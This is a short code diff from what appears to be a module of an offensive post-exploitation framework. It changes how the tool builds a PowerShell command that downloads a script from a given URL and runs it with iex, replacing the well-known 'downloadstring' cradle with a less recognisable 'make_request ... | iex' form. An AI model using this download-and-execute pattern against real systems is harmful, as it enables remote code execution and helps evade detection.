@@ -34,7 +34,8 @@ class CustomModule(Module):
             if not self.args["url"]:
                 cprint("URL required for option 1", "red")
                 return
-            function = 'iex(new-object net.webclient).downloadstring("{}")'.format(self.args["url"])
+            #function = 'iex(new-object net.webclient).downloadstring("{}")'.format(self.args["url"])
+            function = '(make_request -URL "{}") | iex'.format(self.args["url"])
             call = True
         elif op == "2":
             self.show_catalog()
